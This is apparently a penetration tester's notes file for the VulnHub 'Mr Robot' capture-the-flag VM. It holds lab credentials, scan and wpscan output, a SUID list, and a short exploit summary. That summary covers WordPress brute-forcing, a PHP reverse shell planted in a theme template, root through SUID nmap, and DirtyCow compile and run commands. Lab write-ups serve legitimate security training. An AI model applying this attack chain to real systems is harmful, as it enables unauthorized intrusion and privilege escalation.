BOX NAME: MrRobot  
LINK: https://www.vulnhub.com/entry/mr-robot-1,151/

IP=192.168.0.173  
URL=

# Credentials:

\[+\] elliot:ER28-0652  
\[+\] mich05654  
\[+\] bn_wordpress:570fd42948  
\[+\] robot:abcdefghijklmnopqrstuvwxyz

# Hashes:

\[+\] robot:c3fcd3d76192e4007dfb496cca67e13b

# Remote Enumeration:

Host Discovery

```
 192.168.0.173   08:00:27:a1:80:15      1      60  PCS Systemtechnik GmbH  
```

Nmap scan

```
└─# nmap -n $IP -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 15:42 CET
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 192.168.0.173, 16) => Operation not permitted
Offending packet: TCP 192.168.0.143:48833 > 192.168.0.173:28515 S ttl=38 id=23140 iplen=44  seq=3128531238 win=1024 <mss 1460>
Nmap scan report for 192.168.0.173
Host is up (0.00045s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:A1:80:15 (Oracle VirtualBox virtual NIC)

```

# Hosts and computers:

\[+\] HOSTS:  
\[+\] FQDN:  
\[+\] COMPUTER NAME:  
\[+\] OS:

# Look at.

\[+\]

# Special searchsploit findings:

\[+\] Port 21 \[FTP\]  
\[+\] Port 22 \[SSH\]  
\[+\] Port 23 \[TELNET\]  
\[+\] Port 25 \[SMTP\]  
\[+\] Port 53 \[DNS\]  
\[+\] Port 80 \[HTTP\]  
\[+\] Port 88 \[Kerberos\]  
\[+\] Port 110 \[POP3\]  
\[+\] Port 111 \[NFS\]  
\[+\] Port 137 \[NETBIOS\]  
\[+\] Port 139 \[NETBIOS\]  
\[+\] Port 143 \[IMAP\]  
\[+\] Port 443 \[HTTPS\]  
\[+\] Port 445 \[SAMBA\]  
\[+\] Port 464 \[Kerberos\]  
\[+\] Port 465 \[SMTP\]  
\[+\] Port 631 \[CUPS\]  
\[+\] Port 587 \[SMTP /SSL\]  
\[+\] Port 993 \[IMAP /SSL\]  
\[+\] Port 995 \[POP3 /SSL\]  
\[+\] Port 1194 \[OPENVPN\]  
\[+\] Port 2049 \[NFS\]  
\[+\] Port 3306 \[MySQL\]  
\[+\] Port 5432 \[PostgreSQL\]  
\[+\] Port 5900 \[VNC\]  
\[+\] Port 5901 \[VNC\]  
\[+\] Port 6001 \[X-SERVER\]  
\[+\] Port 6667 \[IRC\]  
\[+\] Port 6668 \[IRC\]  
\[+\] Port 6669 \[IRC\]  
\[+\] Port 6881 \[TORRENT\]  
\[+\] Port 8080 \[HTTP\]

# FTP:

\[+\] ftp anonyomus@$IP

# SMB:

\[+\] smbclient -L $IP

# NFS:

\[+\] showmount -e $IP  
\[+\] mount -t nfs $IP:/remote/folder local/folder

# SMTP:

\[+\] smtp-user-enum -U users.txt -t $IP

# HTTP/HTTPS:

\[+\] feroxbuster -u $IP -d 1

```
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 92ms]
phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 93ms]
feed                    [Status: 200, Size: 813, Words: 12, Lines: 22, Duration: 441ms]
rss                     [Status: 200, Size: 366, Words: 10, Lines: 14, Duration: 5324ms]
wp-login                [Status: 200, Size: 2762, Words: 117, Lines: 54, Duration: 7776ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 1583ms]
license                 [Status: 200, Size: 19930, Words: 3334, Lines: 386, Duration: 1507ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 1571ms]
atom                    [Status: 200, Size: 629, Words: 30, Lines: 18, Duration: 7820ms]
rss2                    [Status: 200, Size: 813, Words: 12, Lines: 22, Duration: 6979ms]
                        [Status: 200, Size: 1077, Words: 189, Lines: 31, Duration: 1461ms]
readme                  [Status: 200, Size: 7334, Words: 759, Lines: 98, Duration: 1344ms]
```

\[+\] gobuster dir http://$IP  
\[+\] gobuster vhost http://$IP

\[+\] Nikto --url http://$IP -C all

```
└─# nikto -url $IP       
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.173
+ Target Hostname:    192.168.0.173
+ Target Port:        80
+ Start Time:         2022-11-05 15:44:09 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://192.168.0.173/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2022-11-05 15:47:06 (GMT1) (177 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

\[+\] ffuf -u '$URL/FUZZ' -w wordlist.txt -fs filtersize

# enum4linux:

\[+\] enum4linux -A $IP

# CMS:

\[+\] cmseek -u http://$IP --random-agent

\[+\] wpscan -u $IP

```
    [+] akismet                                                                                                                           
     | Location: http://192.168.0.173/wp-content/plugins/akismet/                                                                         
     | Latest Version: 5.0.1                                                                                                              
     | Last Updated: 2022-09-28T15:27:00.000Z                                                                                             
     |                                                                                                                                    
     | Found By: Known Locations (Aggressive Detection)                                                                                   
     |  - http://192.168.0.173/wp-content/plugins/akismet/, status: 403                                                                   
     |                                                                                                                                    
     | The version could not be determined.                                                                                               

    [+] all-in-one-seo-pack                                                                                                               
     | Location: http://192.168.0.173/wp-content/plugins/all-in-one-seo-pack/                                                             
     | Last Updated: 2022-11-02T14:10:00.000Z                                                                                             
     | Readme: http://192.168.0.173/wp-content/plugins/all-in-one-seo-pack/readme.txt                                                     
     | [!] The version is out of date, the latest version is 4.2.6.1
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/all-in-one-seo-pack/, status: 403
     |
     | Version: 2.0.4 (50% confidence)
     | Found By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/all-in-one-seo-pack/readme.txt

    [+] all-in-one-wp-migration
     | Location: http://192.168.0.173/wp-content/plugins/all-in-one-wp-migration/
     | Last Updated: 2022-10-26T10:10:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/all-in-one-wp-migration/readme.txt
     | [!] The version is out of date, the latest version is 7.67
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/all-in-one-wp-migration/, status: 403
     |
     | Version: 2.0.4 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/all-in-one-wp-migration/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/all-in-one-wp-migration/readme.txt

    [+] contact-form-7
     | Location: http://192.168.0.173/wp-content/plugins/contact-form-7/
     | Last Updated: 2022-10-19T09:20:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/contact-form-7/readme.txt
     | [!] The version is out of date, the latest version is 5.6.4
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/contact-form-7/, status: 403
     |
     | Version: 4.1 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/contact-form-7/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/contact-form-7/readme.txt

    [+] feed
     | Location: http://192.168.0.173/wp-content/plugins/feed/
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/feed/, status: 200
     |
     | The version could not be determined.

    [+] google-analytics-for-wordpress
     | Location: http://192.168.0.173/wp-content/plugins/google-analytics-for-wordpress/
     | Last Updated: 2022-10-11T18:30:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/google-analytics-for-wordpress/readme.txt
     | [!] The version is out of date, the latest version is 8.9.1
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/google-analytics-for-wordpress/, status: 403
     |
     | Version: 5.3.2 (80% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/google-analytics-for-wordpress/readme.txt

    [+] google-sitemap-generator
     | Location: http://192.168.0.173/wp-content/plugins/google-sitemap-generator/
     | Last Updated: 2022-06-16T04:18:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/google-sitemap-generator/readme.txt
     | [!] The version is out of date, the latest version is 4.1.5
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/google-sitemap-generator/, status: 403
     |
     | Version: 4.0.7.1 (80% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/google-sitemap-generator/readme.txt

    [+] jetpack
     | Location: http://192.168.0.173/wp-content/plugins/jetpack/
     | Last Updated: 2022-11-02T15:31:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/jetpack/readme.txt
     | [!] The version is out of date, the latest version is 11.5.1
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/jetpack/, status: 403
     |
     | Version: 3.3.2 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/jetpack/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/jetpack/readme.txt

    [+] simple-tags
     | Location: http://192.168.0.173/wp-content/plugins/simple-tags/
     | Last Updated: 2022-11-02T13:41:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/simple-tags/readme.txt
     | [!] The version is out of date, the latest version is 3.6.4
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/simple-tags/, status: 403
     |
     | Version: 2.4.1 (80% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/simple-tags/readme.txt

    [+] wp-mail-smtp
     | Location: http://192.168.0.173/wp-content/plugins/wp-mail-smtp/
     | Last Updated: 2022-10-06T11:19:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/wp-mail-smtp/readme.txt
     | [!] The version is out of date, the latest version is 3.6.1
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wp-mail-smtp/, status: 403
     |
     | Version: 0.9.5 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wp-mail-smtp/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wp-mail-smtp/readme.txt

    [+] wptouch
     | Location: http://192.168.0.173/wp-content/plugins/wptouch/
     | Last Updated: 2022-08-25T15:28:00.000Z
     | Readme: http://192.168.0.173/wp-content/plugins/wptouch/readme.txt
     | [!] The version is out of date, the latest version is 4.3.44
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wptouch/, status: 403
     |
     | Version: 3.7.3 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wptouch/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://192.168.0.173/wp-content/plugins/wptouch/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov  5 16:44:00 2022
[+] Requests Done: 101065
[+] Cached Requests: 24
[+] Data Sent: 26.84 MB
[+] Data Received: 32.263 MB
[+] Memory used: 516.34 MB
[+] Elapsed time: 00:21:05
```

\[+\] droopescan -u $IP

\[+\] joomscan -u $IP -ec

# Local Filesystem Findings:

\[+\] FILES OF INTEREST

\[+\] SUID

```
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

\[+\] SGID

\[+\] Dumps, outputs, other useful information

```html
└─# curl $URL            
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    <link rel="stylesheet" href="css/A.main-600a9791.css.pagespeed.cf.P2Q6sxo6Yb.css">

    <script src="js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js.pagespeed.jm.I78cfHQpbQ.js"></script>
    <script src="js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js"></script>
</body>
</html>
```

# Kernel Info:

\[+\] file /bin/bash

```
/bin/bash: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=54967822da027467f21e65a1eac7576dec7dd821, stripped
```

\[+\] lsb_release -a

```
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.2 LTS
Release:        14.04
Codename:       trusty
```

\[+\] uname -a

```
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```

# Exploits and Payloads:

\[+\] Found wordpres site. Enumerated. Found .dic file on webserver  
\[+\] used fsociety.dic to bruteforce wordpress.  
\[+\] edited twentyfifteen 404.php template with php revshell  
\[+\] dumped mysql-passwd, enumerated local file system and found old version of nmap  
\[+\] leveraged nmap in interactive mode to pop a root shell.  
\[+\] dirtycow2 is also usable.

```
DirtyCow2 (CVE 2016–5195) \\
cd /base/exploits/kernel ; python3 -m http.server  
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dirty2.cpp -lutil
./dcow -s 
```

# Writeup:

==PROOF==

```
key 1 073403c8a58a1f80d943455fb30724b9
key 2 822c73956184f694993bede3eb39f959
key 3 04787ddef27c3dee1ee161b21670b4e4
```